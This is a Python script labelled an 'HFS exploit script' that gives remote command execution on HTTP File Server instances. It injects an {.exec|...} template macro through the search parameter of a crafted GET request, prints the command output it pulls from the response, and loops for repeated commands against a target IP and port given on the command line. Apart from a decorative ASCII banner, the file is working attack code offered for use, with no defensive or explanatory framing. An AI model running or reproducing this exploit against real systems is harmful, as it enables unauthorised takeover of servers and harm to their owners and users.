import socket
import re
import argparse

def receive_until(sock, delimiter):
    buffer = b""
    while delimiter not in buffer:
        data = sock.recv(1)
        if not data:
            break
        buffer += data
    return buffer

def receive_all(sock, length):
    buffer = b""
    while len(buffer) < length:
        data = sock.recv(length - len(buffer))
        if not data:
            break
        buffer += data
    return buffer

def main(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    
    cmd = input("Let's Fuck Them! : ")
    cmd = cmd.replace(" ", "+")
    req = (
        "GET /?n=%0A&cmd=" + cmd + "&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1\r\n"
    )

    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\n"
    req += "Connection: close\r\n"
    req += "\r\n"

    sock.send(req.encode())

    headers = receive_until(sock, b"\r\n\r\n").decode()
    headers, body_delimiter = headers.split("\r\n\r\n", 1)

    content_length = 0
    for line in headers.split("\r\n"):
        if line.lower().startswith("content-length:"):
            content_length = int(line.split(":")[1].strip())
            break

    print("len:", content_length)
    body = receive_all(sock, content_length).decode('gb2312', errors='ignore')
    pattern = re.compile(r"RESULT:(.*?)====", re.DOTALL)
    match = pattern.search(body)

    if match:
        result_content = match.group(1).strip()
        print("Result:")
        print(result_content)
    else:
        print("Pattern not found")
        print(body)

    sock.close()

def banner():
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    RESET = "\033[0m"
    
    title = f'''
{RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣻⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠶⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠷⢰⣆⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡄
⢀⠀⠙⢿⣿⣷⠀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣼⠏⠁
⠈⠀⣧⠀⠛⢿⡿⢿⣿⣿⣶⣄⢠⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠾⠞⠛⠋⢁⠀⠀
⠀⠀⠘⠁⠆⠀⠁⡀⠹⠟⣿⣿⡾⣷⠀⢀⣿⣷⠀⣠⣿⣷⣆⠀⢰⣿⣿⣷⠀⢠⣾⣇⠀⣼⠃⠰⡿⢹⠋⠀⠀⢠⢺⠀⡎⠀⠀
⠀⠀⠀⠀⠀⠈⠆⠀⢀⡀⠉⠈⠃⠈⠠⣾⣿⣿⢠⣿⣿⣿⣿⠂⢸⣿⣿⣿⣗⣻⣿⣿⡦⢿⡼⠇⠁⠀⠃⠀⡇⠘⠈⠀⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠘⠀⠈⢷⠈⢷⠄⠀⠃⠙⠿⠏⣼⣿⣿⣿⣿⣦⣾⣿⢿⣿⣵⠟⠿⠛⠁⠈⢳⠐⠀⡠⢠⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢅⣸⡆⠀⠀⠀⢀⠀⠛⠿⠿⠛⠛⠋⠻⣿⣼⠻⠿⡀⢀⣤⣀⠀⣦⠀⠈⠃⠘⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⣆⠀⢀⣾⡆⢼⣷⣶⠀⣾⣵⢀⣿⣷⠀⣿⡇⢸⣿⣿⡀⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⣾⠟⠁⣸⣿⡟⠘⣿⡟⢸⣿⡿⠀⢿⡇⠸⣿⡟⠇⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠙⠟⠁⠀⠉⠁⠈⠛⠇⠀⠀⠁⠀⠁⠀⠀⠀
            
         _______  ______   _______  _______ 
        (  ___  )(  __  \ (  ____ \(       )
        | (   ) || (  \  )| (    \/| () () |
        | (___) || |   ) || (__    | || || |
        |  ___  || |   | ||  __)   | |(_)| |
        | (   ) || |   ) || (      | |   | |
        | )   ( || (__/  )| (____/\| )   ( |
        |/     \|(______/ (_______/|/     \|
                                                                                                 ⠀
{GREEN}⠀⠀⠀⠀⠀                                                                                                                
'''
    print(title)
  
   

if __name__ == '__main__':
    banner()

    parser = argparse.ArgumentParser(description="HFS exploit script")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    args = parser.parse_args()

    ip = args.ip
    port = args.port

    while True:
        main(ip, port)
